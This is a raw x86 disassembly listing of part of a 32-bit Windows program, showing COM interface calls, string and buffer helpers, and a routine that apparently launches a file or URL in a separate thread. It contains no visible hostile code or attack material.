  40656c:	cmp    DWORD PTR [ebx+0x24],eax
  40656f:	je     0x406728
  406575:	mov    esi,DWORD PTR [ecx]
  406577:	lea    eax,[ebp-0xc]
  40657a:	push   eax
  40657b:	push   DWORD PTR [ebx+0x10]
  40657e:	push   ecx
  40657f:	mov    ecx,DWORD PTR [esi+0x44]
  406582:	call   DWORD PTR ds:0x409254
  406588:	call   DWORD PTR [esi+0x44]
  40658b:	mov    edi,eax
  40658d:	test   edi,edi
  40658f:	js     0x4066be
  406595:	mov    eax,DWORD PTR [ebp-0xc]
  406598:	lea    edx,[ebp-0x10]
  40659b:	push   edx
  40659c:	push   eax
  40659d:	mov    ecx,DWORD PTR [eax]
  40659f:	mov    esi,DWORD PTR [ecx+0x1c]
  4065a2:	mov    ecx,esi
  4065a4:	call   DWORD PTR ds:0x409254
  4065aa:	call   esi
  4065ac:	mov    edi,eax
  4065ae:	test   edi,edi
  4065b0:	js     0x4066be
  4065b6:	mov    edi,DWORD PTR [ebp-0x10]
  4065b9:	test   edi,edi
  4065bb:	js     0x4066be
  4065c1:	mov    ecx,DWORD PTR [ebx+0x1c]
  4065c4:	push   DWORD PTR [ebx+0x24]
  4065c7:	push   ecx
  4065c8:	mov    eax,DWORD PTR [ecx]
  4065ca:	mov    esi,DWORD PTR [eax+0x40]
  4065cd:	mov    ecx,esi
  4065cf:	call   DWORD PTR ds:0x409254
  4065d5:	call   esi
  4065d7:	mov    edi,eax
  4065d9:	test   edi,edi
  4065db:	js     0x4066be
  4065e1:	cmp    BYTE PTR [ebx+0x44],0x0
  4065e5:	je     0x406647
  4065e7:	mov    eax,DWORD PTR [ebx+0x1c]
  4065ea:	lea    ecx,[ebp-0x8]
  4065ed:	push   ecx
  4065ee:	push   DWORD PTR [ebx+0x48]
  4065f1:	mov    esi,DWORD PTR [eax]
  4065f3:	push   eax
  4065f4:	mov    ecx,DWORD PTR [esi+0x58]
  4065f7:	call   DWORD PTR ds:0x409254
  4065fd:	call   DWORD PTR [esi+0x58]
  406600:	mov    edi,eax
  406602:	test   edi,edi
  406604:	js     0x4066be
  40660a:	mov    eax,DWORD PTR [ebp-0x8]
  40660d:	lea    ecx,[ebx+0x4c]
  406610:	push   ecx
  406611:	push   eax
  406612:	mov    edx,DWORD PTR [eax]
  406614:	mov    esi,DWORD PTR [edx+0x20]
  406617:	mov    ecx,esi
  406619:	call   DWORD PTR ds:0x409254
  40661f:	call   esi
  406621:	mov    edi,eax
  406623:	test   edi,edi
  406625:	js     0x4066be
  40662b:	mov    eax,DWORD PTR [ebx+0xc]
  40662e:	push   edi
  40662f:	push   eax
  406630:	mov    ecx,DWORD PTR [eax]
  406632:	mov    esi,DWORD PTR [ecx+0x10]
  406635:	mov    ecx,esi
  406637:	call   DWORD PTR ds:0x409254
  40663d:	call   esi
  40663f:	mov    edi,eax
  406641:	test   edi,edi
  406643:	js     0x4066be
  406645:	jmp    0x4066ba
  406647:	push   0xd
  406649:	lea    edi,[ebx-0x4]
  40664c:	xor    ecx,ecx
  40664e:	pop    eax
  40664f:	mov    WORD PTR [ebp-0x20],ax
  406653:	test   edi,edi
  406655:	je     0x40665f
  406657:	lea    eax,[ebx+0x4]
  40665a:	mov    DWORD PTR [ebp-0x18],eax
  40665d:	jmp    0x406662
  40665f:	mov    DWORD PTR [ebp-0x18],ecx
  406662:	lea    esi,[ebx+0x20]
  406665:	mov    edx,DWORD PTR [esi]
  406667:	test   edx,edx
  406669:	je     0x406682
  40666b:	mov    eax,DWORD PTR [edx]
  40666d:	push   edx
  40666e:	mov    esi,DWORD PTR [eax+0x8]
  406671:	mov    ecx,esi
  406673:	call   DWORD PTR ds:0x409254
  406679:	call   esi
  40667b:	xor    ecx,ecx
  40667d:	lea    esi,[ebx+0x20]
  406680:	mov    DWORD PTR [esi],ecx
  406682:	lea    edx,[ebx+0x8]
  406685:	test   edi,edi
  406687:	jne    0x40668d
  406689:	mov    edx,ecx
  40668b:	jmp    0x406690
  40668d:	lea    ecx,[ebx+0x4]
  406690:	mov    eax,DWORD PTR [ebx+0x1c]
  406693:	push   esi
  406694:	sub    esp,0x10
  406697:	lea    esi,[ebp-0x20]
  40669a:	mov    edi,esp
  40669c:	mov    ebx,DWORD PTR [eax]
  40669e:	push   edx
  40669f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a0:	push   ecx
  4066a1:	mov    ecx,DWORD PTR [ebx+0x44]
  4066a4:	push   eax
  4066a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a8:	call   DWORD PTR ds:0x409254
  4066ae:	call   DWORD PTR [ebx+0x44]
  4066b1:	mov    edi,eax
  4066b3:	test   edi,edi
  4066b5:	jns    0x4066d8
  4066b7:	mov    ebx,DWORD PTR [ebp+0x8]
  4066ba:	test   edi,edi
  4066bc:	jns    0x4066d8
  4066be:	mov    ecx,DWORD PTR [ebx+0xc]
  4066c1:	test   ecx,ecx
  4066c3:	je     0x4066d8
  4066c5:	mov    eax,DWORD PTR [ecx]
  4066c7:	push   edi
  4066c8:	push   ecx
  4066c9:	mov    esi,DWORD PTR [eax+0x10]
  4066cc:	mov    ecx,esi
  4066ce:	call   DWORD PTR ds:0x409254
  4066d4:	call   esi
  4066d6:	mov    edi,eax
  4066d8:	mov    eax,DWORD PTR [ebp-0xc]
  4066db:	test   eax,eax
  4066dd:	je     0x4066ef
  4066df:	mov    ecx,DWORD PTR [eax]
  4066e1:	push   eax
  4066e2:	mov    esi,DWORD PTR [ecx+0x8]
  4066e5:	mov    ecx,esi
  4066e7:	call   DWORD PTR ds:0x409254
  4066ed:	call   esi
  4066ef:	mov    eax,DWORD PTR [ebp-0x8]
  4066f2:	test   eax,eax
  4066f4:	je     0x406706
  4066f6:	mov    ecx,DWORD PTR [eax]
  4066f8:	push   eax
  4066f9:	mov    esi,DWORD PTR [ecx+0x8]
  4066fc:	mov    ecx,esi
  4066fe:	call   DWORD PTR ds:0x409254
  406704:	call   esi
  406706:	mov    eax,DWORD PTR [ebp+0x8]
  406709:	add    eax,0x2c
  40670c:	push   eax
  40670d:	call   DWORD PTR ds:0x409078
  406713:	mov    ecx,DWORD PTR [ebp-0x4]
  406716:	mov    eax,edi
  406718:	pop    edi
  406719:	pop    esi
  40671a:	xor    ecx,ebp
  40671c:	pop    ebx
  40671d:	call   0x4071f0
  406722:	mov    esp,ebp
  406724:	pop    ebp
  406725:	ret    0xc
  406728:	mov    edi,0x80070057
  40672d:	jmp    0x4066ba
  40672f:	int3   
  406730:	int3   
  406731:	int3   
  406732:	int3   
  406733:	int3   
  406734:	int3   
  406735:	int3   
  406736:	int3   
  406737:	int3   
  406738:	int3   
  406739:	int3   
  40673a:	int3   
  40673b:	int3   
  40673c:	int3   
  40673d:	int3   
  40673e:	int3   
  40673f:	int3   
  406740:	mov    edi,edi
  406742:	push   ebp
  406743:	mov    ebp,esp
  406745:	sub    esp,0xc
  406748:	mov    eax,ds:0x408008
  40674d:	xor    eax,ebp
  40674f:	mov    DWORD PTR [ebp-0x4],eax
  406752:	push   ebx
  406753:	push   esi
  406754:	push   edi
  406755:	mov    edi,DWORD PTR [ebp+0x8]
  406758:	lea    esi,[edi+0x30]
  40675b:	push   esi
  40675c:	call   DWORD PTR ds:0x409028
  406762:	mov    ecx,DWORD PTR [ebp+0x10]
  406765:	xor    eax,eax
  406767:	mov    DWORD PTR [ebp-0x8],eax
  40676a:	mov    DWORD PTR [ebp-0xc],eax
  40676d:	test   ecx,ecx
  40676f:	je     0x4067df
  406771:	cmp    DWORD PTR [ebp+0xc],eax
  406774:	je     0x4067df
  406776:	cmp    DWORD PTR [edi+0x10],eax
  406779:	je     0x4067df
  40677b:	mov    eax,DWORD PTR [ecx]
  40677d:	lea    edx,[ebp-0x8]
  406780:	push   edx
  406781:	push   ecx
  406782:	mov    edi,DWORD PTR [eax+0x1c]
  406785:	mov    ecx,edi
  406787:	call   DWORD PTR ds:0x409254
  40678d:	call   edi
  40678f:	mov    ebx,eax
  406791:	test   ebx,ebx
  406793:	js     0x4067da
  406795:	mov    eax,DWORD PTR [ebp-0x8]
  406798:	lea    edx,[ebp-0xc]
  40679b:	push   edx
  40679c:	push   eax
  40679d:	mov    ecx,DWORD PTR [eax]
  40679f:	mov    edi,DWORD PTR [ecx+0x3c]
  4067a2:	mov    ecx,edi
  4067a4:	call   DWORD PTR ds:0x409254
  4067aa:	call   edi
  4067ac:	mov    ebx,eax
  4067ae:	test   ebx,ebx
  4067b0:	js     0x4067da
  4067b2:	mov    eax,DWORD PTR [ebp+0x8]
  4067b5:	xor    ebx,ebx
  4067b7:	cmp    BYTE PTR [eax+0x48],bl
  4067ba:	mov    ecx,DWORD PTR [eax+0x10]
  4067bd:	mov    eax,DWORD PTR [ebp-0xc]
  4067c0:	sete   bl
  4067c3:	xor    edx,edx
  4067c5:	inc    ebx
  4067c6:	div    ebx
  4067c8:	mov    edi,DWORD PTR [ecx]
  4067ca:	push   eax
  4067cb:	push   ecx
  4067cc:	mov    ecx,DWORD PTR [edi+0xc]
  4067cf:	call   DWORD PTR ds:0x409254
  4067d5:	call   DWORD PTR [edi+0xc]
  4067d8:	mov    ebx,eax
  4067da:	mov    eax,DWORD PTR [ebp-0x8]
  4067dd:	jmp    0x4067e4
  4067df:	mov    ebx,0x80070057
  4067e4:	test   eax,eax
  4067e6:	je     0x4067f8
  4067e8:	mov    ecx,DWORD PTR [eax]
  4067ea:	push   eax
  4067eb:	mov    edi,DWORD PTR [ecx+0x8]
  4067ee:	mov    ecx,edi
  4067f0:	call   DWORD PTR ds:0x409254
  4067f6:	call   edi
  4067f8:	push   esi
  4067f9:	call   DWORD PTR ds:0x409078
  4067ff:	mov    ecx,DWORD PTR [ebp-0x4]
  406802:	mov    eax,ebx
  406804:	pop    edi
  406805:	pop    esi
  406806:	xor    ecx,ebp
  406808:	pop    ebx
  406809:	call   0x4071f0
  40680e:	mov    esp,ebp
  406810:	pop    ebp
  406811:	ret    0xc
  406814:	int3   
  406815:	int3   
  406816:	int3   
  406817:	int3   
  406818:	int3   
  406819:	int3   
  40681a:	int3   
  40681b:	int3   
  40681c:	int3   
  40681d:	int3   
  40681e:	int3   
  40681f:	int3   
  406820:	mov    edi,edi
  406822:	push   ebp
  406823:	mov    ebp,esp
  406825:	push   ecx
  406826:	mov    eax,ds:0x408008
  40682b:	xor    eax,ebp
  40682d:	mov    DWORD PTR [ebp-0x4],eax
  406830:	push   ebx
  406831:	mov    ebx,DWORD PTR [ebp+0x8]
  406834:	push   esi
  406835:	push   edi
  406836:	lea    esi,[ebx+0x30]
  406839:	push   esi
  40683a:	call   DWORD PTR ds:0x409028
  406840:	mov    ecx,DWORD PTR [ebx+0x14]
  406843:	test   ecx,ecx
  406845:	je     0x40687a
  406847:	cmp    DWORD PTR [ebx+0x24],0x0
  40684b:	je     0x40687a
  40684d:	mov    eax,DWORD PTR [ecx]
  40684f:	push   ecx
  406850:	mov    edi,DWORD PTR [eax+0x30]
  406853:	mov    ecx,edi
  406855:	call   DWORD PTR ds:0x409254
  40685b:	call   edi
  40685d:	mov    edi,eax
  40685f:	test   edi,edi
  406861:	js     0x40687d
  406863:	mov    eax,DWORD PTR [ebx+0x24]
  406866:	push   eax
  406867:	mov    ecx,DWORD PTR [eax]
  406869:	mov    edi,DWORD PTR [ecx+0x30]
  40686c:	mov    ecx,edi
  40686e:	call   DWORD PTR ds:0x409254
  406874:	call   edi
  406876:	mov    edi,eax
  406878:	jmp    0x40687d
  40687a:	xor    edi,edi
  40687c:	inc    edi
  40687d:	push   esi
  40687e:	call   DWORD PTR ds:0x409078
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    eax,edi
  406889:	pop    edi
  40688a:	pop    esi
  40688b:	xor    ecx,ebp
  40688d:	pop    ebx
  40688e:	call   0x4071f0
  406893:	mov    esp,ebp
  406895:	pop    ebp
  406896:	ret    0x4
  406899:	int3   
  40689a:	int3   
  40689b:	int3   
  40689c:	int3   
  40689d:	int3   
  40689e:	int3   
  40689f:	int3   
  4068a0:	mov    edi,edi
  4068a2:	push   ebp
  4068a3:	mov    ebp,esp
  4068a5:	sub    esp,0xc
  4068a8:	mov    eax,ds:0x408008
  4068ad:	xor    eax,ebp
  4068af:	mov    DWORD PTR [ebp-0x4],eax
  4068b2:	push   ebx
  4068b3:	mov    ebx,DWORD PTR [ebp+0x8]
  4068b6:	push   esi
  4068b7:	push   edi
  4068b8:	xor    esi,esi
  4068ba:	lea    edi,[ebx+0x24]
  4068bd:	mov    DWORD PTR [ebp-0xc],esi
  4068c0:	push   edi
  4068c1:	call   DWORD PTR ds:0x409028
  4068c7:	mov    DWORD PTR [ebp-0x8],esi
  4068ca:	cmp    DWORD PTR [ebp+0xc],esi
  4068cd:	je     0x406947
  4068cf:	cmp    DWORD PTR [ebp+0x10],esi
  4068d2:	je     0x406947
  4068d4:	cmp    DWORD PTR [ebx+0x4],esi
  4068d7:	je     0x406947
  4068d9:	mov    eax,DWORD PTR [ebx+0x14]
  4068dc:	test   eax,eax
  4068de:	je     0x406947
  4068e0:	mov    esi,DWORD PTR [eax]
  4068e2:	lea    ecx,[ebp-0x8]
  4068e5:	push   ecx
  4068e6:	push   DWORD PTR [ebx+0x18]
  4068e9:	mov    ecx,DWORD PTR [esi+0x4c]
  4068ec:	push   eax
  4068ed:	call   DWORD PTR ds:0x409254
  4068f3:	call   DWORD PTR [esi+0x4c]
  4068f6:	mov    ebx,eax
  4068f8:	test   ebx,ebx
  4068fa:	js     0x406942
  4068fc:	mov    eax,DWORD PTR [ebp-0x8]
  4068ff:	lea    edx,[ebp-0xc]
  406902:	push   edx
  406903:	push   eax
  406904:	mov    ecx,DWORD PTR [eax]
  406906:	mov    esi,DWORD PTR [ecx+0x1c]
  406909:	mov    ecx,esi
  40690b:	call   DWORD PTR ds:0x409254
  406911:	call   esi
  406913:	mov    ebx,eax
  406915:	test   ebx,ebx
  406917:	js     0x406942
  406919:	mov    eax,DWORD PTR [ebp-0x8]
  40691c:	mov    ecx,DWORD PTR [ebp+0x8]
  40691f:	add    ecx,0x44
  406922:	push   ecx
  406923:	mov    edx,DWORD PTR [eax]
  406925:	push   eax
  406926:	mov    esi,DWORD PTR [edx+0x20]
  406929:	mov    ecx,esi
  40692b:	call   DWORD PTR ds:0x409254
  406931:	call   esi
  406933:	mov    ebx,eax
  406935:	test   ebx,ebx
  406937:	js     0x406942
  406939:	cmp    DWORD PTR [ebp-0xc],0x0
  40693d:	jge    0x406942
  40693f:	mov    ebx,DWORD PTR [ebp-0xc]
  406942:	mov    esi,DWORD PTR [ebp-0x8]
  406945:	jmp    0x40694c
  406947:	mov    ebx,0x80070057
  40694c:	mov    eax,DWORD PTR [ebp+0x8]
  40694f:	mov    ecx,DWORD PTR [eax+0x4]
  406952:	test   ecx,ecx
  406954:	je     0x40696c
  406956:	mov    eax,DWORD PTR [ecx]
  406958:	push   ebx
  406959:	push   ecx
  40695a:	mov    esi,DWORD PTR [eax+0x10]
  40695d:	mov    ecx,esi
  40695f:	call   DWORD PTR ds:0x409254
  406965:	call   esi
  406967:	mov    esi,DWORD PTR [ebp-0x8]
  40696a:	mov    ebx,eax
  40696c:	test   esi,esi
  40696e:	je     0x406980
  406970:	mov    eax,DWORD PTR [esi]
  406972:	push   esi
  406973:	mov    esi,DWORD PTR [eax+0x8]
  406976:	mov    ecx,esi
  406978:	call   DWORD PTR ds:0x409254
  40697e:	call   esi
  406980:	push   edi
  406981:	call   DWORD PTR ds:0x409078
  406987:	mov    ecx,DWORD PTR [ebp-0x4]
  40698a:	mov    eax,ebx
  40698c:	pop    edi
  40698d:	pop    esi
  40698e:	xor    ecx,ebp
  406990:	pop    ebx
  406991:	call   0x4071f0
  406996:	mov    esp,ebp
  406998:	pop    ebp
  406999:	ret    0xc
  40699c:	int3   
  40699d:	int3   
  40699e:	int3   
  40699f:	int3   
  4069a0:	int3   
  4069a1:	int3   
  4069a2:	int3   
  4069a3:	int3   
  4069a4:	int3   
  4069a5:	int3   
  4069a6:	int3   
  4069a7:	int3   
  4069a8:	int3   
  4069a9:	int3   
  4069aa:	int3   
  4069ab:	int3   
  4069ac:	int3   
  4069ad:	int3   
  4069ae:	int3   
  4069af:	int3   
  4069b0:	mov    edi,edi
  4069b2:	push   ebp
  4069b3:	mov    ebp,esp
  4069b5:	sub    esp,0xc
  4069b8:	mov    eax,ds:0x408008
  4069bd:	xor    eax,ebp
  4069bf:	mov    DWORD PTR [ebp-0x4],eax
  4069c2:	push   ebx
  4069c3:	mov    ebx,DWORD PTR [ebp+0x8]
  4069c6:	push   esi
  4069c7:	push   edi
  4069c8:	lea    esi,[ebx+0x28]
  4069cb:	push   esi
  4069cc:	call   DWORD PTR ds:0x409028
  4069d2:	mov    ecx,DWORD PTR [ebp+0x10]
  4069d5:	xor    eax,eax
  4069d7:	mov    DWORD PTR [ebp-0x8],eax
  4069da:	mov    DWORD PTR [ebp-0xc],eax
  4069dd:	test   ecx,ecx
  4069df:	je     0x406a4a
  4069e1:	cmp    DWORD PTR [ebp+0xc],eax
  4069e4:	je     0x406a4a
  4069e6:	cmp    DWORD PTR [ebx+0x8],eax
  4069e9:	je     0x406a4a
  4069eb:	mov    eax,DWORD PTR [ecx]
  4069ed:	lea    edx,[ebp-0x8]
  4069f0:	push   edx
  4069f1:	push   ecx
  4069f2:	mov    edi,DWORD PTR [eax+0x1c]
  4069f5:	mov    ecx,edi
  4069f7:	call   DWORD PTR ds:0x409254
  4069fd:	call   edi
  4069ff:	mov    ebx,eax
  406a01:	test   ebx,ebx
  406a03:	js     0x406a45
  406a05:	mov    eax,DWORD PTR [ebp-0x8]
  406a08:	lea    edx,[ebp-0xc]
  406a0b:	push   edx
  406a0c:	push   eax
  406a0d:	mov    ecx,DWORD PTR [eax]
  406a0f:	mov    edi,DWORD PTR [ecx+0x20]
  406a12:	mov    ecx,edi
  406a14:	call   DWORD PTR ds:0x409254
  406a1a:	call   edi
  406a1c:	mov    ebx,eax
  406a1e:	test   ebx,ebx
  406a20:	js     0x406a45
  406a22:	mov    ecx,DWORD PTR [ebp+0x8]
  406a25:	mov    eax,DWORD PTR [ebp-0xc]
  406a28:	cdq    
  406a29:	sub    eax,edx
  406a2b:	mov    ecx,DWORD PTR [ecx+0x8]
  406a2e:	sar    eax,1
  406a30:	add    eax,0x32
  406a33:	push   eax
  406a34:	mov    edi,DWORD PTR [ecx]
  406a36:	push   ecx
  406a37:	mov    ecx,DWORD PTR [edi+0xc]
  406a3a:	call   DWORD PTR ds:0x409254
  406a40:	call   DWORD PTR [edi+0xc]
  406a43:	mov    ebx,eax
  406a45:	mov    eax,DWORD PTR [ebp-0x8]
  406a48:	jmp    0x406a4f
  406a4a:	mov    ebx,0x80070057
  406a4f:	test   eax,eax
  406a51:	je     0x406a63
  406a53:	mov    ecx,DWORD PTR [eax]
  406a55:	push   eax
  406a56:	mov    edi,DWORD PTR [ecx+0x8]
  406a59:	mov    ecx,edi
  406a5b:	call   DWORD PTR ds:0x409254
  406a61:	call   edi
  406a63:	push   esi
  406a64:	call   DWORD PTR ds:0x409078
  406a6a:	mov    ecx,DWORD PTR [ebp-0x4]
  406a6d:	mov    eax,ebx
  406a6f:	pop    edi
  406a70:	pop    esi
  406a71:	xor    ecx,ebp
  406a73:	pop    ebx
  406a74:	call   0x4071f0
  406a79:	mov    esp,ebp
  406a7b:	pop    ebp
  406a7c:	ret    0xc
  406a7f:	int3   
  406a80:	int3   
  406a81:	int3   
  406a82:	int3   
  406a83:	int3   
  406a84:	int3   
  406a85:	int3   
  406a86:	int3   
  406a87:	int3   
  406a88:	int3   
  406a89:	int3   
  406a8a:	int3   
  406a8b:	int3   
  406a8c:	int3   
  406a8d:	int3   
  406a8e:	int3   
  406a8f:	int3   
  406a90:	mov    edi,edi
  406a92:	push   ebp
  406a93:	mov    ebp,esp
  406a95:	push   ebx
  406a96:	push   esi
  406a97:	push   edi
  406a98:	mov    edi,DWORD PTR [ebp+0x8]
  406a9b:	xor    ebx,ebx
  406a9d:	test   edi,edi
  406a9f:	jne    0x406aa8
  406aa1:	mov    esi,0x80070057
  406aa6:	jmp    0x406af8
  406aa8:	push   edi
  406aa9:	mov    ebx,edi
  406aab:	call   DWORD PTR ds:0x409084
  406ab1:	test   eax,eax
  406ab3:	je     0x406aa1
  406ab5:	push   0x2
  406ab7:	push   0x0
  406ab9:	call   DWORD PTR ds:0x409110
  406abf:	mov    esi,eax
  406ac1:	test   esi,esi
  406ac3:	js     0x406af8
  406ac5:	push   0x5
  406ac7:	xor    eax,eax
  406ac9:	push   eax
  406aca:	push   eax
  406acb:	push   edi
  406acc:	push   0x401884
  406ad1:	push   eax
  406ad2:	call   DWORD PTR ds:0x40909c
  406ad8:	cmp    eax,0x20
  406adb:	jg     0x406af2
  406add:	call   DWORD PTR ds:0x409040
  406ae3:	mov    esi,eax
  406ae5:	test   esi,esi
  406ae7:	jle    0x406af2
  406ae9:	movzx  esi,si
  406aec:	or     esi,0x80070000
  406af2:	call   DWORD PTR ds:0x409100
  406af8:	push   ebx
  406af9:	call   DWORD PTR ds:0x409088
  406aff:	pop    edi
  406b00:	mov    eax,esi
  406b02:	pop    esi
  406b03:	pop    ebx
  406b04:	pop    ebp
  406b05:	ret    0x4
  406b08:	int3   
  406b09:	int3   
  406b0a:	int3   
  406b0b:	int3   
  406b0c:	int3   
  406b0d:	int3   
  406b0e:	int3   
  406b0f:	int3   
  406b10:	mov    edi,edi
  406b12:	push   ebp
  406b13:	mov    ebp,esp
  406b15:	push   ecx
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	push   DWORD PTR [ebp+0xc]
  406b1c:	xor    esi,esi
  406b1e:	xor    ebx,ebx
  406b20:	xor    edi,edi
  406b22:	call   DWORD PTR ds:0x409084
  406b28:	test   eax,eax
  406b2a:	jne    0x406b33
  406b2c:	mov    esi,0x80070057
  406b31:	jmp    0x406b7f
  406b33:	push   DWORD PTR [ebp+0xc]
  406b36:	call   DWORD PTR ds:0x409094
  406b3c:	mov    edi,eax
  406b3e:	test   edi,edi
  406b40:	jne    0x406b49
  406b42:	mov    esi,0x8007000e
  406b47:	jmp    0x406b7f
  406b49:	lea    eax,[ebp-0x4]
  406b4c:	push   eax
  406b4d:	xor    eax,eax
  406b4f:	push   eax
  406b50:	push   edi
  406b51:	push   0x406a90
  406b56:	push   eax
  406b57:	push   eax
  406b58:	call   DWORD PTR ds:0x40918c
  406b5e:	mov    ebx,eax
  406b60:	test   ebx,ebx
  406b62:	jne    0x406b7d
  406b64:	call   DWORD PTR ds:0x409040
  406b6a:	mov    esi,eax
  406b6c:	test   esi,esi
  406b6e:	jle    0x406b7b
  406b70:	movzx  esi,si
  406b73:	or     esi,0x80070000
  406b79:	test   esi,esi
  406b7b:	js     0x406b7f
  406b7d:	xor    edi,edi
  406b7f:	push   edi
  406b80:	call   DWORD PTR ds:0x409088
  406b86:	test   ebx,ebx
  406b88:	je     0x406b91
  406b8a:	push   ebx
  406b8b:	call   DWORD PTR ds:0x409134
  406b91:	pop    edi
  406b92:	mov    eax,esi
  406b94:	pop    esi
  406b95:	pop    ebx
  406b96:	mov    esp,ebp
  406b98:	pop    ebp
  406b99:	ret    0x8
  406b9c:	int3   
  406b9d:	int3   
  406b9e:	int3   
  406b9f:	int3   
  406ba0:	int3   
  406ba1:	mov    edi,edi
  406ba3:	push   ebp
  406ba4:	mov    ebp,esp
  406ba6:	push   ecx
  406ba7:	mov    eax,ds:0x408008
  406bac:	xor    eax,ebp
  406bae:	mov    DWORD PTR [ebp-0x4],eax
  406bb1:	push   ebx
  406bb2:	push   esi
  406bb3:	push   edi
  406bb4:	mov    edi,DWORD PTR [ebp+0x8]
  406bb7:	mov    ebx,ecx
  406bb9:	test   edi,edi
  406bbb:	jne    0x406bd9
  406bbd:	mov    ecx,DWORD PTR [ebx]
  406bbf:	test   ecx,ecx
  406bc1:	je     0x406bd5
  406bc3:	mov    eax,DWORD PTR [ecx]
  406bc5:	push   ecx
  406bc6:	mov    esi,DWORD PTR [eax+0x8]
  406bc9:	mov    ecx,esi
  406bcb:	call   DWORD PTR ds:0x409254
  406bd1:	call   esi
  406bd3:	and    DWORD PTR [ebx],edi
  406bd5:	xor    eax,eax
  406bd7:	jmp    0x406c03
  406bd9:	mov    eax,DWORD PTR [edi]
  406bdb:	push   edi
  406bdc:	mov    esi,DWORD PTR [eax+0x4]
  406bdf:	mov    ecx,esi
  406be1:	call   DWORD PTR ds:0x409254
  406be7:	call   esi
  406be9:	mov    eax,DWORD PTR [ebx]
  406beb:	test   eax,eax
  406bed:	je     0x406bff
  406bef:	mov    ecx,DWORD PTR [eax]
  406bf1:	push   eax
  406bf2:	mov    esi,DWORD PTR [ecx+0x8]
  406bf5:	mov    ecx,esi
  406bf7:	call   DWORD PTR ds:0x409254
  406bfd:	call   esi
  406bff:	mov    DWORD PTR [ebx],edi
  406c01:	mov    eax,edi
  406c03:	mov    ecx,DWORD PTR [ebp-0x4]
  406c06:	pop    edi
  406c07:	pop    esi
  406c08:	xor    ecx,ebp
  406c0a:	pop    ebx
  406c0b:	call   0x4071f0
  406c10:	mov    esp,ebp
  406c12:	pop    ebp
  406c13:	ret    0x4
  406c16:	int3   
  406c17:	int3   
  406c18:	int3   
  406c19:	int3   
  406c1a:	int3   
  406c1b:	mov    edi,edi
  406c1d:	push   ebp
  406c1e:	mov    ebp,esp
  406c20:	cmp    DWORD PTR [ebp+0x8],0x0
  406c24:	je     0x406c5e
  406c26:	mov    edx,DWORD PTR [ebp+0x8]
  406c29:	push   ebx
  406c2a:	push   edi
  406c2b:	xor    ebx,ebx
  406c2d:	lea    edi,[edx+0x2]
  406c30:	mov    ax,WORD PTR [edx]
  406c33:	add    edx,0x2
  406c36:	cmp    ax,bx
  406c39:	jne    0x406c30
  406c3b:	sub    edx,edi
  406c3d:	sar    edx,1
  406c3f:	pop    edi
  406c40:	pop    ebx
  406c41:	cmp    edx,0x7fffffff
  406c47:	jbe    0x406c53
  406c49:	mov    eax,0x8007006f
  406c4e:	mov    DWORD PTR [ecx+0x4],eax
  406c51:	jmp    0x406c60
  406c53:	push   edx
  406c54:	push   DWORD PTR [ebp+0x8]
  406c57:	call   0x406dd0
  406c5c:	jmp    0x406c60
  406c5e:	xor    eax,eax
  406c60:	pop    ebp
  406c61:	ret    0x8
  406c64:	int3   
  406c65:	int3   
  406c66:	int3   
  406c67:	int3   
  406c68:	int3   
  406c69:	mov    edi,edi
  406c6b:	push   ebp
  406c6c:	mov    ebp,esp
  406c6e:	push   ecx
  406c6f:	push   edi
  406c70:	mov    edi,ecx
  406c72:	mov    eax,DWORD PTR [edi+0x4]
  406c75:	test   eax,eax
  406c77:	js     0x406d06
  406c7d:	push   ebx
  406c7e:	mov    ebx,DWORD PTR [ebp+0x8]
  406c81:	inc    ebx
  406c82:	lea    eax,[ebx-0x1]
  406c85:	cmp    eax,0x3ffffff
  406c8a:	ja     0x406cfd
  406c8c:	cmp    ebx,DWORD PTR [edi+0xc]
  406c8f:	jle    0x406cf9
  406c91:	mov    eax,DWORD PTR [edi]
  406c93:	and    al,0x6
  406c95:	cmp    al,0x4
  406c97:	jne    0x406ca0
  406c99:	mov    eax,0x8007007a
  406c9e:	jmp    0x406d02
  406ca0:	lea    eax,[ebx+ebx*1]
  406ca3:	push   eax
  406ca4:	push   0x0
  406ca6:	call   DWORD PTR ds:0x40914c
  406cac:	push   eax
  406cad:	call   DWORD PTR ds:0x409148
  406cb3:	mov    ecx,eax
  406cb5:	mov    DWORD PTR [ebp-0x4],ecx
  406cb8:	test   ecx,ecx
  406cba:	jne    0x406cc6
  406cbc:	and    DWORD PTR [edi+0x8],eax
  406cbf:	mov    eax,0x8007000e
  406cc4:	jmp    0x406d02
  406cc6:	cmp    DWORD PTR [edi+0x10],0x0
  406cca:	je     0x406cf3
  406ccc:	mov    eax,DWORD PTR [edi+0x8]
  406ccf:	push   esi
  406cd0:	add    eax,eax
  406cd2:	push   eax
  406cd3:	push   DWORD PTR [edi+0x10]
  406cd6:	push   ecx
  406cd7:	call   0x407af0
  406cdc:	mov    esi,DWORD PTR [edi+0x8]
  406cdf:	add    esp,0xc
  406ce2:	mov    ecx,edi
  406ce4:	call   0x406d12
  406ce9:	and    DWORD PTR [edi],0xfffffffe
  406cec:	mov    ecx,DWORD PTR [ebp-0x4]
  406cef:	mov    DWORD PTR [edi+0x8],esi
  406cf2:	pop    esi
  406cf3:	mov    DWORD PTR [edi+0x10],ecx
  406cf6:	mov    DWORD PTR [edi+0xc],ebx
  406cf9:	xor    eax,eax
  406cfb:	jmp    0x406d05
  406cfd:	mov    eax,0x8007006f
  406d02:	mov    DWORD PTR [edi+0x4],eax
  406d05:	pop    ebx
  406d06:	pop    edi
  406d07:	mov    esp,ebp
  406d09:	pop    ebp
  406d0a:	ret    0x4
  406d0d:	int3   
  406d0e:	int3   
  406d0f:	int3   
  406d10:	int3   
  406d11:	int3   
  406d12:	mov    edi,edi
  406d14:	push   esi
  406d15:	mov    esi,ecx
  406d17:	mov    eax,DWORD PTR [esi]
  406d19:	test   al,0x1
  406d1b:	jne    0x406d56
  406d1d:	push   edi
  406d1e:	shr    eax,1
  406d20:	push   0x0
  406d22:	pop    edi
  406d23:	and    eax,0x3
  406d26:	jne    0x406d3b
  406d28:	push   DWORD PTR [esi+0x10]
  406d2b:	push   edi
  406d2c:	call   DWORD PTR ds:0x40914c
  406d32:	push   eax
  406d33:	call   DWORD PTR ds:0x40913c
  406d39:	jmp    0x406d49
